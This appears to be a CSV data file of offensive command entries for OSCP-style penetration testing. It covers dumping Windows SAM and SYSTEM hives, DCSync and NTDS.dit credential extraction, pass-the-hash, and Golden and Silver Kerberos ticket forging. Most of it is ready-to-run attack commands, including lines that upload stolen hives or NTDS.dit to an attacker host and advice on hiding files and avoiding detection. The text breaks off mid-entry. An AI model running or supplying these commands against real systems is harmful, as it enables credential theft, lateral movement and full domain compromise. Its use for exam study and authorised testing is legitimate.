"ad-sam-dump-reg-save","Dump SAM and SYSTEM Hives with reg save","post-exploit","reg save HKLM\SAM sam.hive && reg save HKLM\SYSTEM system.hive","Export SAM and SYSTEM registry hives for offline local account password hash extraction. Requires local admin. Use secretsdump.py on Kali to extract NTLM hashes.","credential-dumping","STANDARD method for local account hash extraction on Windows workstations and member servers. Advantage over LSASS dump: Smaller files (< 25MB total), no AV alerts (reg save is legitimate admin operation), offline processing. OSCP WORKFLOW: (1) Get admin shell, (2) reg save both hives, (3) Transfer to Kali (SMB/HTTP), (4) Extract hashes: impacket-secretsdump -sam sam.hive -system system.hive LOCAL. Output format: USERNAME:RID:LM:NTLM::: (Hashcat mode 1000). Use for Pass-the-Hash lateral movement or password cracking. Time estimate: 2-5 seconds (export) + 5-30 seconds (transfer) + 2 seconds (hash extraction).

MANUAL ALTERNATIVES:

Export to temp directory:
reg save HKLM\SAM %TEMP%\sam.hive
reg save HKLM\SYSTEM %TEMP%\system.hive
cd %TEMP%

Export directly to SMB share (no local storage):
smbserver.py share /tmp/ (on Kali)  
reg save HKLM\SAM \\<LHOST>\share\sam.hive
reg save HKLM\SYSTEM \\<LHOST>\share\system.hive

Export with alternate names (OPSEC):
reg save HKLM\SAM update.tmp
reg save HKLM\SYSTEM svchost.dat

Extract hashes on Kali with secretsdump:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
# Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:: ...

Extract specific user:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL | grep Administrator

Extract with pypykatz (Python alternative):
pypykatz registry --sam sam.hive system.hive > hashes.txt

Parse NTLM hashes only (for hashcat):
impacket-secretsdump -sam sam.hive -system system.hive LOCAL | cut -d':' -f4 > ntlm.txt
hashcat -m 1000 ntlm.txt rockyou.txt

Pass-the-Hash with extracted hash:
impacket-psexec -hashes :<NTLM_HASH> './administrator@<TARGET_IP>'

Export SECURITY hive (LSA secrets - additional credentials):
reg save HKLM\SECURITY security.hive
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

Automated script (all hives + cleanup):
@echo off
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
copy *.hive \\<LHOST>\share\
del sam.hive system.hive security.hive

WHAT YOU GET:
- Local account NTLM hashes (Administrator, backup accounts, service accounts)
- LM hashes (if enabled on old systems - rarely useful)
- LSA secrets (if SECURITY hive exported): service account passwords, machine account password, cached domain credentials

WHAT YOU DON'T GET:
- Domain account hashes (need DCSync or NTDS.dit)
- Cleartext passwords (need LSASS dump + Mimikatz)
- Kerberos tickets (need LSASS dump)
- Currently logged-in user credentials (need LSASS dump)

USE CASES:
- Workstation local admin hash extraction
- Member server local account compromise
- Backup admin account discovery
- Pass-the-Hash preparation for lateral movement
- Offline password cracking

OPSEC:
- Event ID 4656/4663 (registry access) logged
- Sysmon Event ID 12/13 (registry modification) if deployed
- Low suspicion - reg save is legitimate admin task
- Files should be deleted after exfiltration

FILE TRANSFER:
1. SMB: copy *.hive \\<LHOST>\share\ (fastest)
2. HTTP upload: curl -X POST -F sam=@sam.hive -F system=@system.hive http://<LHOST>:8080/upload
3. Base64 encode (small files): certutil -encode sam.hive sam.txt
4. PowerShell: IWR -Uri http://<LHOST>:8080/upload -Method POST -InFile sam.hive

CLEANUP:
del sam.hive system.hive (on target after exfiltration)

TIME ESTIMATE:
Export hives: 2-5 seconds
Transfer (SMB): 5-30 seconds (depends on connection, typically <25MB total)
Hash extraction on Kali: 1-2 seconds  
Total: 10-40 seconds","high"
"crackmapexec-sam-dump","CrackMapExec - Automated SAM Dump","post-exploit","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --sam","Automatically dump local account hashes (SAM database) from remote Windows system using CrackMapExec. Combines reg save + secretsdump in one command. Cleaner than manual SAM extraction.","credential-dumping","FASTEST SAM dump method - fully automated extraction and parsing. Combines reg save + secretsdump + cleanup in one command. OSCP ADVANTAGE: No need to manually transfer files or run separate extraction - CME outputs hashes directly. WHEN TO USE: Quick SAM harvesting across multiple targets, automated credential dumping in large networks. DISADVANTAGE: Less stealthy than manual reg save (multiple SMB connections), CME may be flagged by EDR. Time estimate: 5-15 seconds per target.

MANUAL ALTERNATIVES:

Pass-the-Hash:
crackmapexec smb <TARGET> -u <USER> -H <NTLM> --sam

Local account authentication:
crackmapexec smb <TARGET> -u administrator -p <PASS> --local-auth --sam

Domain account with local admin rights:
crackmapexec smb <TARGET> -u 'DOMAIN/admin' -p <PASS> --sam

Multiple targets (subnet):
crackmapexec smb 192.168.50.0/24 -u administrator -p <PASS> --sam

From file of targets:
crackmapexec smb targets.txt -u administrator -p <PASS> --sam

Dump LSA secrets (additional credentials):
crackmapexec smb <TARGET> -u <USER> -p <PASS> --lsa

Dump both SAM and LSA:
crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam --lsa

Save output to file:
crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam > sam_hashes.txt

Combine with password spraying:
crackmapexec smb <TARGET> -u users.txt -p <PASS> --sam --continue-on-success

OUTPUT FORMAT:
SMB <TARGET> 445 <HOSTNAME> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
                              ^USERNAME   ^RID ^LM_HASH                       ^NTLM_HASH

PARSING OUTPUT:
Extract NTLM hashes only:
crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam | grep ""::"" | cut -d':' -f4

Extract Administrator hash:
crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam | grep Administrator | cut -d':' -f4

USE CASES:
- Quick local account hash harvesting
- Automated credential dumping across multiple workstations
- Pass-the-Hash attack preparation
- Finding password reuse (same local admin password on multiple machines)

COMPARISON TO ALTERNATIVES:
Manual reg save: More steps, requires file transfer, more control
CME --sam: Automated, one command, faster, less granular control
impacket-secretsdump -sam: Offline processing, requires pre-dumped hives

LATERAL MOVEMENT WORKFLOW:
1. Credential discovery: crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam
2. Extract Administrator hash from output
3. Pass-the-Hash to other machines: crackmapexec smb 192.168.50.0/24 -u administrator -H <HASH> --sam
4. Build credential database, identify password reuse patterns
5. Escalate to domain admin via credential chaining

TIME ESTIMATE:
Single target: 5-15 seconds
Subnet scan (10 hosts): 30-90 seconds  
Large network (100 hosts): 5-15 minutes","high"
"ad-dcsync-ntds-credentials","Extract Credentials from Offline NTDS.dit","post-exploit","impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL","Offline extraction of ALL domain credentials from NTDS.dit database file. Use after exfiltrating NTDS.dit and SYSTEM hive from Domain Controller. Extracts thousands of hashes for entire AD domain.","credential-dumping","COMPLETE domain credential harvest via offline NTDS.dit processing. WHEN TO USE: After exfiltrating NTDS.dit from DC (via vssadmin/ntdsutil), for comprehensive password analysis, when DCSync is blocked or logged. ADVANTAGE: Offline processing (no DC interaction after exfiltration), complete domain view (all users/computers/groups). DISADVANTAGE: Requires NTDS.dit exfiltration (multi-GB file, high risk). OSCP EXAM: Rarely needed (DCSync with secretsdump -just-dc faster). More common in labs for comprehensive credential analysis. Time estimate: 30 seconds - 5 minutes (depends on NTDS.dit size).

MANUAL ALTERNATIVES:

Extract with password history:
impacket-secretsdump -ntds ntds.dit -system system.hive -history LOCAL

Save to files:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL -outputfile corp_dump
# Creates: corp_dump.ntds, corp_dump.secrets, corp_dump.kerberos

Extract specific users only:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -i ""admin\|krbtgt\|service""

Parse NTLM hashes only (for Hashcat):
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep ""::"" | cut -d':' -f4 > ntlm_hashes.txt
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

Extract krbtgt for Golden Ticket:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep krbtgt

Count total user accounts:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -c ""::""

NTDS.DIT EXTRACTION METHODS:

1. Volume Shadow Copy (VSS) - RECOMMENDED:
vssadmin create shadow /for=C:
copy <SHADOW_PATH>\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
vssadmin delete shadows /for=C: /quiet
reg save HKLM\SYSTEM C:\Temp\system.hive

2. ntdsutil (older method):
ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\Temp\IFM"" q q
# Creates ntds.dit in C:\Temp\IFM\Active Directory\

3. PowerShell (VSS automation):
$shadow = (gwmi -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')
$id = $shadow.ShadowID  
$path = (gwmi Win32_ShadowCopy | ?{$_.ID -eq $id}).DeviceObject
cmd /c copy ""$path\Windows\NTDS\ntds.dit"" C:\Temp\ntds.dit
(gwmi Win32_ShadowCopy | ?{$_.ID -eq $id}).Delete()

4. CrackMapExec automation:
crackmapexec smb <DC_IP> -u <DA_USER> -p <PASS> --ntds vss
# Automatically extracts, dumps, and cleans up

FILE TRANSFER (NTDS.dit is large - 100MB to 50GB):

1. Compress first:
7z a -tgzip ntds.dit.gz ntds.dit (reduces to ~10-20% original size)
copy ntds.dit.gz \\<LHOST>\share\

2. Split if too large:
fsutil file createnew dummy 104857600
certutil -split -f ntds.dit 100000000 ntds.dit.part
# Transfer parts separately, then rejoin on Kali: cat ntds.dit.part* > ntds.dit

3. SMB server (direct transfer):
smbserver.py share /tmp/ (on Kali)
copy ntds.dit \\<LHOST>\share\ (on DC)

4. HTTP upload (compressed):
7z a ntds.dit.gz ntds.dit
curl -X POST -F file=@ntds.dit.gz http://<LHOST>:8080/upload

OUTPUT ANALYSIS:

Find enabled users (UAC flag):
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -v ""ACCOUNTDISABLE""

Find admin accounts (RID 500-520):
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep "":50[0-9]:""

Find computer accounts:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep ""\$:""

Find service accounts (common naming):
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -i ""svc\|sql\|backup\|service""

Password analysis with hashcat:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | cut -d':' -f4 | sort -u > unique_hashes.txt
hashcat -m 1000 unique_hashes.txt rockyou.txt -r best64.rule --force
# Identifies weak passwords across entire domain

TIME ESTIMATE:
Extraction (VSS): 30-120 seconds (depends on NTDS.dit size)
Transfer: 1-30 minutes (100MB-50GB file, connection dependent)
Processing with secretsdump: 30 seconds - 5 minutes (depends on domain size)
Total: 2-35 minutes","medium"
"download-powerview","Download PowerView from GitHub","enumeration","iwr -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -OutFile PowerView.ps1","Download PowerView.ps1 from PowerSploit repository to current directory","","PowerView is the most widely-used PowerShell tool for Active Directory enumeration.

Part of PowerSploit framework.

For OSCP exam environments without internet, transfer PowerView.ps1 via file-transfer techniques (SMB, HTTP, base64).

Always verify file integrity after download.","high"
"curl-download-powerview","Download PowerView using curl","enumeration","curl -o PowerView.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","Download PowerView.ps1 using curl command (alternative method)","","curl is available on Windows 10 1803+ and Windows Server 2019+.

For older systems, use PowerShell's Invoke-WebRequest (download-powerview) or certutil.","high"
"download-sharphound","Download SharpHound from GitHub","enumeration","iwr -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile SharpHound.ps1","Download SharpHound.ps1 PowerShell collector for BloodHound from official repository","","SharpHound is the official data collector for BloodHound.

Collects AD objects, permissions, sessions, and relationships.

PowerShell version (SharpHound.ps1) is easier to transfer but more detectable.

For OSCP:
SharpHound.exe (compiled) is preferred for stealth.

Transfer to target via file-transfer techniques if no internet access.","high"
"import-sharphound","Import SharpHound Module","enumeration",". .\SharpHound.ps1","Import SharpHound PowerShell module for BloodHound data collection","","After importing, use Invoke-BloodHound to collect data.

SharpHound generates ZIP file containing JSON data for BloodHound analysis.

Noisy on network - creates many LDAP queries and SMB connections.

OSCP:
SharpHound valuable for understanding AD attack paths but manual enumeration also required.","high"
"download-powerup","Download PowerUp from GitHub","post-exploit","iwr -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -OutFile PowerUp.ps1","Download PowerUp.ps1 privilege escalation enumeration tool from PowerSploit repository","","PowerUp automates Windows privilege escalation enumeration.

Checks for service misconfigurations, unquoted service paths, modifiable service binaries, AlwaysInstallElevated, DLL hijacking, and more.

Essential tool for Windows post-exploitation.

OSCP:
Always run PowerUp after gaining initial access to Windows system.","high"
"set-executionpolicy-bypass","Bypass PowerShell Execution Policy","post-exploit","Set-ExecutionPolicy Bypass -Scope Process -Force","Temporarily bypass PowerShell execution policy for current process to allow script execution","","Windows execution policy is NOT a security boundary - it's a safety feature to prevent accidental script execution.

-Scope Process applies only to current PowerShell window and resets when window closes.

Does not require administrator privileges.

OSCP:
Always run this first when importing PowerShell scripts.

Alternative:
Launch PowerShell with 'powershell -ep bypass' flag instead of using Set-ExecutionPolicy.","high"
"powershell-ep-bypass-flag","Launch PowerShell with Execution Policy Bypass","post-exploit","powershell -ep bypass -nop","Start new PowerShell session with execution policy bypassed and no profile loading","","This method bypasses execution policy at launch rather than changing it after launch.

-nop prevents profile scripts from running which can interfere with imported modules.

Preferred method for clean PowerShell environment.

OSCP:
Use this when launching PowerShell from command shell (cmd.exe) or after gaining code execution.","high"
"ad-dcsync-secretsdump-user","DCSync Specific User with Impacket (Linux)","post-exploit","impacket-secretsdump -just-dc-user <USERNAME> '<DOMAIN>/<DA_USER>:<PASSWORD>@<DC_IP>'","Extract single user's password hash from Domain Controller using DRSUAPI replication. Linux-based alternative to Mimikatz. RECOMMENDED for OSCP exams - clean output, no Windows AV interference.","active-directory","THIS IS THE PREFERRED DCSYNC METHOD FOR OSCP. Why: (1) Works from Kali (no Windows access needed), (2) No AV interference, (3) Output ready for Hashcat, (4) Same command works with -hashes for PTH. CRITICAL EXAM TIP: ALWAYS use single quotes around auth string to handle special chars in passwords. Output format is Hashcat-ready - copy the dave:1103:aad3b...:08d7a47... line directly into hashcat. Time estimate: 2-10 seconds for single user.

MANUAL ALTERNATIVES:
Pass-the-Hash (when you have NTLM hash, not password):
impacket-secretsdump -hashes :<NTLM_HASH> -just-dc-user krbtgt '<DOMAIN>/<USER>@<DC_IP>'

Use DC FQDN with explicit IP:
impacket-secretsdump -just-dc-user Administrator -target-ip 192.168.50.70 'corp.com/admin:pass@DC1.corp.com'

Kerberos authentication (requires TGT):
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass -just-dc-user krbtgt 'corp.com/admin@DC1.corp.com'

Dump with history:
impacket-secretsdump -just-dc-user dave -history '<DOMAIN>/<USER>:<PASS>@<DC_IP>'

Extract multiple users:
for user in dave Administrator krbtgt; do impacket-secretsdump -just-dc-user $user 'corp.com/admin:pass@192.168.50.70' | grep ""$user:""; done

Parse NTLM hash only:
impacket-secretsdump -just-dc-user dave 'corp.com/admin:pass@192.168.50.70' | grep dave: | cut -d':' -f4

TIME ESTIMATE: 2-10 seconds (single user), 30-120 seconds (full domain dump with -just-dc)","high"
"ad-dcsync-secretsdump-krbtgt","DCSync krbtgt with Impacket (Golden Ticket)","post-exploit","impacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<DA_USER>:<PASSWORD>@<DC_IP>'","Extract krbtgt account hash for Golden Ticket creation. CRITICAL first step after achieving Domain Admin access. The krbtgt hash enables persistent domain-wide access via forged TGTs.","active-directory","ALWAYS the FIRST target after achieving Domain Admin. OSCP EXAM WORKFLOW: (1) Get DA, (2) DCSync krbtgt, (3) Save hash externally, (4) Get Domain SID (lookupsid.py or rpcclient), (5) Create Golden Ticket with ticketer.py or Mimikatz. The output line you need: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<32_HEX_CHARS>:::' - copy the 32 hex characters after the third colon. Time estimate: 2-10 seconds.

MANUAL ALTERNATIVES:
With Pass-the-Hash:
impacket-secretsdump -hashes :<DA_NTLM_HASH> -just-dc-user krbtgt '<DOMAIN>/<DA_USER>@<DC_IP>'

Extract krbtgt + get Domain SID in one command:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' && \
rpcclient -U 'corp.com/admin%pass' 192.168.50.70 -c 'lsaquery'

Parse NTLM hash only (for ticketer.py):
krbtgt_hash=$(impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' | grep krbtgt | cut -d':' -f4)
echo ""krbtgt NTLM hash: $krbtgt_hash""

Extract both NTLM and AES256:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' > krbtgt_full.txt
grep aes256 krbtgt_full.txt

Golden Ticket workflow (complete chain):
# 1. Get krbtgt hash
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'
# 2. Get Domain SID
lookupsid.py 'corp.com/admin:pass@192.168.50.70' | grep ""Domain SID""
# 3. Create Golden Ticket
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain corp.com Administrator
# 4. Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.com/Administrator@DC1.corp.com

TIME ESTIMATE: 2-10 seconds (extraction only), 1-2 minutes (full Golden Ticket workflow)","high"
"ad-dcsync-secretsdump-all","DCSync All Domain Hashes (Full Dump)","post-exploit","impacket-secretsdump -just-dc '<DOMAIN>/<DA_USER>:<PASSWORD>@<DC_IP>'","Extract ALL domain user password hashes via DCSync. Equivalent to dumping NTDS.dit but remote and cleaner. Use sparingly - generates significant DC logs and traffic.","active-directory","RARELY needed in OSCP - usually target specific users (krbtgt, Administrator) instead. Full dumps useful for: (1) Real penetration tests (password security analysis), (2) CTF/lab environments (find hidden admin accounts), (3) Offline analysis (correlate credentials, find password patterns). OSCP TIP: Prefer -just-dc-user for exam - faster, quieter, more targeted. Full dumps can take 30+ seconds on small domains, 15+ minutes on large domains. Time estimate: 30 seconds - 15 minutes (domain size dependent).

MANUAL ALTERNATIVES:
Save to file for analysis:
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' -outputfile corp_hashes
# Creates: corp_hashes.ntds (hashes), corp_hashes.secrets (LSA secrets), corp_hashes.cached (cached creds)

Faster dump (NTLM only, no Kerberos keys):
impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70'

Filter enabled users only:
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep -v ""ACCOUNTDISABLE""

Extract specific user types:
# Administrators only (RID 500-520)
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep "":50[0-9]:""
# Computer accounts
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep ""\$:""
# Service accounts (common naming)
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep -i ""svc\|service\|sql\|backup""

Hashcat workflow:
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' > all_hashes.txt
cut -d':' -f4 all_hashes.txt > ntlm_hashes.txt
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r best64.rule --force

TIME ESTIMATE: 30 seconds (small domain <100 users), 2-5 minutes (medium <1000 users), 10-30 minutes (large 5000+ users)","medium"
"net-accounts-policy","Net Accounts - Domain Password Policy","enumeration","net accounts","Display Active Directory password policy from domain-joined Windows system (lockout threshold, lockout duration, observation window)","active-directory","CRITICAL for password spraying attacks.

Lockout threshold indicates max failed logins before account lockout.

Lockout observation window shows time until counter resets.

CALCULATION:
With 5 attempts threshold and 30min window, you can safely attempt 4 logins per user every 30 minutes = 192 attempts per user per 24 hours.

TIME ESTIMATE:
<5 seconds.

MANUAL ALTERNATIVE:
Check Group Policy (gpedit.msc → Computer Configuration → Windows Settings → Security Settings → Account Policies → Account Lockout Policy) or query LDAP for lockoutThreshold attribute.

OSCP TIP:
Always run this FIRST before any password attacks to avoid locking out accounts and alerting administrators.","high"
"enum4linux-policy","Enum4linux - Password Policy via SMB","enumeration","enum4linux -P <TARGET>","Enumerate Active Directory password policy from Linux via SMB (supports null sessions or authenticated)","active-directory","STEALTHY method for external password policy discovery.

Often works via NULL SESSION (no credentials required) if SMB null sessions are enabled on DC.

NOISE LEVEL:
Medium (SMB connection logged).

TIME ESTIMATE:
10-30 seconds.

MANUAL ALTERNATIVE:
Use rpcclient with -N flag for null session:
rpcclient -N -U '' <TARGET> then 'getdompwinfo'.

WHY THIS WORKS:
Windows DCs expose password policy via MS-SAMR RPC interface accessible over SMB.

Null sessions may be allowed for backward compatibility.

OSCP TIP:
Try null session first, then authenticated if blocked.

Modern domains often block null sessions.","high"
"crackmapexec-policy","CrackMapExec - Password Policy Enumeration","enumeration","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --pass-pol","Enumerate Active Directory password policy via SMB using CrackMapExec (supports SMBv2/v3, requires credentials)","active-directory","MODERN alternative to enum4linux with SMBv2/v3 support.

REQUIRES valid domain credentials (guest account often works with blank password).

ADVANTAGE:
Works when SMBv1/null sessions disabled.

NOISE LEVEL:
Medium (authenticated SMB connection logged).

TIME ESTIMATE:
5-15 seconds.

WHY THIS WORKS:
CrackMapExec uses MS-SAMR RPC over SMB to query password policy from domain controller.

Any authenticated domain user can read password policy (not privileged information).

OSCP TIP:
If you have ANY valid domain credentials, use this instead of enum4linux.

Try guest:'' first.

Guest account is often enabled with blank password even when null sessions are blocked.","high"
"ldapsearch-policy","ldapsearch - LDAP Password Policy Query","enumeration","ldapsearch -x -H ldap://<TARGET> -b '<DOMAIN_DN>' -s base '(objectClass=*)' lockoutThreshold lockoutDuration lockOutObservationWindow minPwdLength pwdProperties","Query Active Directory password policy directly via LDAP (anonymous or authenticated)","active-directory","MOST DIRECT method - queries password policy attributes directly from AD LDAP.

May work ANONYMOUSLY if anonymous LDAP binding is enabled (uncommon in modern domains).

NOISE LEVEL:
Low (LDAP query, often not logged).

TIME ESTIMATE:
5-10 seconds.

TIME CONVERSION:
lockoutDuration and lockOutObservationWindow are in 100-nanosecond intervals (e.g., 18000000000 = 30 minutes).

Divide by 600000000 to get minutes.

MANUAL ALTERNATIVE:
Use AD Explorer (Windows GUI) or PowerShell Get-ADDefaultDomainPasswordPolicy.

WHY THIS WORKS:
Password policy stored in domain root object in AD, readable by any authenticated user (sometimes anonymous).

OSCP TIP:
Less common than SMB-based enumeration but useful when SMB is blocked or filtered.

Domain DN format:
DC=domain,DC=com (replace dots with ',DC=').

For corp.com use DC=corp,DC=com.","medium"
"ad-silver-ticket-mimikatz-create","Create Silver Ticket with Mimikatz","active-directory","mimikatz # kerberos::golden /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /target:<TARGET_SERVER_FQDN> /service:<SPN_SERVICE> /rc4:<SERVICE_ACCOUNT_NTLM> /user:<IMPERSONATED_USER> /ptt","Forge a Kerberos service ticket (TGS) for a specific SPN using the service account's NTLM hash. The forged ticket grants access to that service with arbitrary user identity and permissions.","kerberos-attacks","OSCP METHODOLOGY - WHEN TO USE SILVER TICKETS:
Silver tickets are LATERAL MOVEMENT and PERSISTENCE techniques that work when you have:
1.

Service account NTLM hash (from Kerberoasting, LSASS dump, or DCSync)
2.

Cannot use the hash directly with Pass-the-Hash (service doesn't support NTLM auth, only Kerberos)
3.

Need access to specific service without full domain compromise
4.

Want stealthier persistence than Golden Ticket (service-level, not domain-level)

SILVER VS OTHER TECHNIQUES:
SILVER TICKET vs PASS-THE-HASH:
- Use PTH:
When service supports NTLM authentication (SMB, WMI, WinRM with CredSSP)
- Use Silver:
When service only accepts Kerberos (IIS with Kerberos-only, SQL Server with integrated auth, modern hardened services)
- Advantage of Silver:
Works against Kerberos-only services, persists in ticket cache for 10 years (default)
- Advantage of PTH:
Simpler (just use hash directly), no ticket forging needed

SILVER TICKET vs GOLDEN TICKET:
- Use Golden:
When you have krbtgt hash (full domain compromise), need domain-wide access, want to impersonate any user to any service
- Use Silver:
When you only have service account hash (partial compromise), need access to ONE specific service, want lower detection risk
- Advantage of Silver:
Stealthier (no DC interaction, service-level only), faster to create (no krbtgt needed)
- Advantage of Golden:
Domain-wide access, works for all services, bypasses most Kerberos security checks
- Detection difference:
Golden tickets generate Event ID 4768 (TGT request) anomalies on DC, Silver tickets only generate Event ID 4769 (TGS usage) on service machine

SILVER TICKET vs KERBEROASTING (continued attack chain):
- Kerberoasting:
Obtain TGS-REP encrypted with service account hash
- Crack TGS-REP:
Get plaintext password or NTLM hash
- Silver Ticket:
Use obtained hash to forge tickets for that service
- This is the TYPICAL OSCP EXAM FLOW:
Kerberoast → Crack → Silver Ticket → Service Access

MANUAL ALTERNATIVES (if Mimikatz unavailable):
Rubeus (recommended alternative):
Rubeus.exe silver /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /rc4:<ntlm_hash> /user:<user> /ptt
- Advantages:
Actively maintained, better OPSEC, cleaner output, supports AES encryption
- Same functionality as Mimikatz kerberos::golden but modern codebase

impacket-ticketer (Linux-based):
python3 ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain> -spn <service>/<target> <username>
- Generates .ccache file (Kerberos credential cache)
- Use with:
export KRB5CCNAME=<username>.ccache, then access service with impacket tools
- LIMITATION:
Can't directly inject into Windows session, must use .ccache with Linux Kerberos tools

COMMON SPN SERVICE TYPES FOR OSCP:
1.

cifs (File Shares, SMB):
Most common lateral movement target
   - Access:
dir \\<server>\C$, copy files, PsExec, remote admin
   - Obtain hash:
Kerberoast user accounts with SPN cifs/<hostname>, or dump LSASS on fileserver
   - OSCP scenario:
Pivot to fileserver, exfiltrate data, plant backdoors

2.

http (IIS, Web Apps):
Common for web-based exploitation
   - Access:
Invoke-WebRequest http://<server>, upload webshell, access admin panels
   - Obtain hash:
Kerberoast IIS service accounts (often named iis_service, websvc, apppooluser)
   - OSCP scenario:
Access restricted web admin interface, upload reverse shell, exploit web vulns

3.

mssql (SQL Server):
Database access and code execution
   - Access:
Invoke-Sqlcmd, xp_cmdshell for RCE, database enumeration
   - Obtain hash:
Kerberoast SQL service accounts (often high-privilege)
   - OSCP scenario:
Enable xp_cmdshell, execute OS commands, escalate to SYSTEM via SQL Agent

4.

ldap (Domain Controllers):
Advanced AD attacks
   - Access:
LDAP queries, directory modifications, DCSync (if permissions exist)
   - Obtain hash:
Compromise DC, dump LSASS, DCSync domain controller computer account
   - OSCP scenario:
Rare for Silver (use Golden instead), but useful for specific LDAP-based exploits

5.

host (Generic Host Services):
Catch-all for multiple services
   - Access:
Multiple protocols (RPC, WMI, scheduled tasks, services)
   - Obtain hash:
Kerberoast computer accounts (machine accounts often have host SPN)
   - OSCP scenario:
Remote service creation, scheduled task execution, WMI code execution

TIME ESTIMATES FOR OSCP EXAM:
- Prerequisite gathering (Domain SID, SPN enumeration):
2-3 minutes
- Service account hash acquisition:
  - Via Kerberoasting (if not done):
5-10 minutes (request TGS, crack with Hashcat)
  - Via LSASS dump (if service account logged on):
2 minutes (Mimikatz sekurlsa::logonpasswords)
  - Via DCSync (if DA already):
1 minute (lsadump::dcsync)
- Silver ticket creation:
<1 minute (Mimikatz command)
- Validation and service access:
1-2 minutes (klist, test access)
- TOTAL:
10-20 minutes end-to-end (assumes hash not yet obtained)

If hash already obtained (e.g., from earlier Kerberoasting):
5 minutes total

DETECTION AND OPSEC:
EVENT IDS GENERATED:
- Mimikatz execution:
Event ID 4688 (Process Creation), AMSI alerts if not obfuscated
- Ticket injection:
Event ID 4768 (TGT Request) - NOT generated (Silver tickets skip TGT step)
- Service access:
Event ID 4769 (TGS Request) - Generated on SERVICE machine, not DC
- Logon event:
Event ID 4624 (Logon Type 3 - Network) on target service machine

DETECTION INDICATORS (Blue Team Perspective):
- Service ticket (TGS) with 10-year lifetime (legitimate tickets expire in hours)
- Service ticket not issued by DC (no corresponding Event ID 4769 on DC)
- Encryption downgrade (RC4 instead of AES256) - modern environments prefer AES
- Account logon from unusual source IP
- Account accessing service it never accessed before (behavioral anomaly)

OPSEC IMPROVEMENTS:
1.

Use /aes256 instead of /rc4 (requires AES key, not NTLM hash):
Mimikatz /aes256:<hex_key>
2.

Set realistic ticket lifetime:
/endin:8 (expires in 8 hours) /renewmax:24 (renewable for 24 hours)
3.

Impersonate real user (/user:<real_username>) instead of fictional admin
4.

Use Rubeus instead of Mimikatz (better evasion, active development)
5.

Clear ticket cache after use:
klist purge

REALITY CHECK FOR OSCP EXAM:
✅ LIKELY SCENARIOS:
- Kerberoast service account → Crack hash → Silver ticket for lateral movement
- Dump LSASS on compromised machine → Find service account hash → Silver ticket to pivot
- Obtain domain admin → DCSync service accounts → Silver tickets for persistence

❌ UNLIKELY SCENARIOS:
- PAC validation enabled (rare in OSCP lab, common in modern enterprise)
- Service account password rotation mid-exam (exam environments are static)
- AES-only Kerberos (OSCP still allows RC4 for compatibility)

COMMON MISTAKES TO AVOID:
1.

Including user RID in Domain SID → Extract Domain SID correctly (remove last segment from whoami /user)
2.

Using NetBIOS name instead of FQDN → Always use FQDN for /domain and /target
3.

Wrong service type → Verify SPN with setspn -Q before forging ticket
4.

Using NTLM hash of WRONG account → Hash must be from service account that runs the SPN, not random domain user
5.

Assuming ticket works domain-wide → Silver tickets are SERVICE-SPECIFIC (cifs ticket won't work for http)

NEXT STEPS AFTER SILVER TICKET:
1.

Access the service:
dir \\<target>\C$ (cifs), iwr http://<target> (http), Invoke-Sqlcmd (mssql)
2.

Establish persistence:
Upload webshell, create scheduled task, add registry run key
3.

Pivot deeper:
